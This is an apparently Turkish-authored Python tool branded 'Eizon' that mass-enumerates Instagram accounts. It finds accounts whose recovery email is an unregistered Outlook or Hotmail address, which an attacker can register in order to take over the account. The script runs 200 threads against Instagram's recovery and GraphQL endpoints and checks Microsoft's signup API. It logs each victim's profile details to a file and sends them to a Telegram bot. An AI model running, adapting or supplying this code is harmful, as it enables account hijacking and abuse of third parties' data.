#@BestEizon / @EizonxTool
import webbrowser
import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from cfonts import render
import webbrowser
webbrowser.open("https://t.me/eizonnxtool")

class Eizon:
    def __init__(self, token, ID):
        self.token = token
        self.ID = ID
        self.hits = 0
        self.badinsta = 0
        self.bademail = 0
        self.goodig = 0
        self.total_hits = 0
        
        
        self.red = "\033[1m\033[31m"
        self.green = "\033[1m\033[32m"
        self.yellow = "\033[1m\033[33m"
        self.blue = "\033[1m\033[34m"
        self.cyan = "\033[1m\033[36m"
        self.magenta = "\033[1m\033[35m"
        self.white = "\033[1m\033[37m"
        self.orange = "\033[1m\033[38;5;208m"
        self.reset = "\033[0m"
        
        
        self.a5 = "\033[1;32m"  
        self.a2 = "\033[1;37m"  
        
        self.setup_services()   
    
    def setup_services(self):
        while True:
            try:
                res = requests.get('https://signup.live.com/signup')
                self.amsc = res.cookies.get_dict().get('amsc')
                self.canary = res.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
                break
            except:
                pass

        while True:
            try:
                a = "https://www.instagram.com/accounts/login"
                session = requests.Session()
                aa = session.get(a)
                self.csrf = aa.cookies.get('csrftoken')
                break
            except:
                pass
    
    def update_stats(self):
        ge = self.hits
        bt = self.badinsta + self.bademail
        be = self.goodig
        status = f"\r     {self.a5}Hits{self.a2}: {ge} // {self.red}Bad İnsta{self.white}: {bt} // {self.yellow}Retries{self.white}: {be} ---- @BestEizon      "
        sys.stdout.write(status)
        sys.stdout.flush()
    
    def rest(self, user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, tr-TR',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive'
            }

            payload = {
                "_csrftoken": "9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
                "query": user
            }
            
            signature = '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f'
            signed_body = f"{signature}.{json.dumps(payload)}"
            
            data = {
                'signed_body': signed_body,
                'ig_sig_key_version': '4'
            }

            response = requests.post(
                'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
                headers=headers, data=data, timeout=10
            ).json()
            
            return response.get('email', 'Email bulunamadı')
        except Exception as e:
            return f'Hata: {str(e)}'
    
    def Sumit(self, uid):
        try:
            uid = int(uid)
            if 1 < uid <= 1278889:
                return 2010
            elif 1279000 <= uid <= 17750000:
                return 2011
            elif 17750001 <= uid <= 279760000:
                return 2012
            elif 279760001 <= uid <= 900990000:
                return 2013
            elif 900990001 <= uid <= 1629010000:
                return 2014
            elif 1629010001 <= uid <= 2369359761:
                return 2015
            elif 2369359762 <= uid <= 4239516754:
                return 2016
            elif 4239516755 <= uid <= 6345108209:
                return 2017
            elif 6345108210 <= uid <= 10016232395:
                return 2018
            elif 10016232396 <= uid <= 27238602159:
                return 2019
            elif 27238602160 <= uid <= 43464475395:
                return 2020
            elif 43464475396 <= uid <= 50289297647:
                return 2021
            elif 50289297648 <= uid <= 57464707082:
                return 2022
            elif 57464707083 <= uid <= 63313426938:
                return 2023
            else:
                return "2024-2025"
        except Exception:
            return 'N/A'
    
    def InfoAcc(self, username, domain):
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://storiesig.info',
            'priority': 'u=1, i',
            'referer': 'https://storiesig.info/',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': str(generate_user_agent()),
        }

        try:
            rrr = requests.get(f'https://api-ig.storiesig.info/api/userInfoByUsername/{username}', headers=headers).json()
            infoinsta = rrr.get('result', {}).get('user', {})
        except Exception as e:
            infoinsta = {}

        User_id = infoinsta.get('pk', 'N/A')
        full_name = infoinsta.get('full_name', 'N/A')
        fows = infoinsta.get('follower_count', 0)
        fowg = infoinsta.get('following_count', 0)
        pp = infoinsta.get('media_count', 0)
        isPraise = infoinsta.get('is_private', False)
        bio = infoinsta.get('biography', 'N/A')
        is_verified = infoinsta.get('is_verified', False)
        bizz = infoinsta.get('is_business', False)
        account_year = self.Sumit(User_id)

        self.total_hits += 1
        self.hits += 1

        reset_info = self.rest(username)

        info_text = f"""
⋘─────━𓆩𝐄𝐈𝐙𝐎𝐍━─────⋙
• Hits: {self.total_hits}
• İsim: {full_name}
• Kullanıcı Adı: {username}
• Email:  {username}@{domain}
• Takipçi: {fows}
• Takip: {fowg}
• Post: {pp}
• Bio: {bio}
• Gizli: {isPraise}
• İd: {User_id}
• Tarih: {account_year}
• Business: {bizz}
• Doğrulanmış: {is_verified}
• Reset: {reset_info}
• Link: https://www.instagram.com/{username}
⋘─────━𓆩𝐄𝐈𝐙𝐎𝐍𓆪‏━─────⋙
𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 ~ @BestEizon • @EizonxTool
"""

        print(info_text)
        
        with open('hits.txt', 'a') as ff:
            ff.write(f'{info_text}\n')

        try:
            requests.get(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.ID}&text={info_text}")
        except Exception as e:
            print(f"[!] Telegram gönderme hatası: {e}")
    
    def hotmail(self, email):
        cookies = {
            'amsc': self.amsc,
        }

        headers = {
            'canary': self.canary,
            'origin': 'https://signup.live.com',
            'referer': 'https://signup.live.com/signup?lic=1&uaid=3daaf5bf6b70499d8a5035844d5bbfd8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'signInName': email,
        }

        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
        
        if '"isAvailable":true' in response:
            self.update_stats()
            username, gg = email.split('@')
            self.InfoAcc(username, gg)
        else:
            self.bademail += 1
            self.update_stats()
    
    def check(self, email):
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            'User-Agent': ua,
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            }),
            'ig_sig_key_version': '4',
        }
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
        if email in response:
            if '@outlook.com' in email or '@hotmail.com' in email:
                self.hotmail(email)
            self.goodig += 1
            self.update_stats()
        else:
            self.badinsta += 1
            self.update_stats()
    
    def besteizon(self):
        session = requests.Session()
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(10000, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            
            try:
                response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                
                if username:
                    emails = [username + '@outlook.com', username + '@hotmail.com']  
                    for email in emails:
                        self.check(email)
            except:
                pass
    
    def start(self):
        for _ in range(200):
            Thread(target=self.besteizon).start()


emir = render('Eizon', colors=['white', 'green'], align='center')
print("\x1b[1;36m" + "—" * 67)
print(emir)
print("𝐃𝐞𝐯 : @BestEizon / @EizonxTool")
print("—" * 67)

token = input('token: ')
ID = input('id: ')
os.system('cls' if os.name == 'nt' else 'clear')

checker = Eizon(token, ID)
checker.start()



# tool tamamen ucretsizdir.

# telegram; @besteizon / @eizonxtool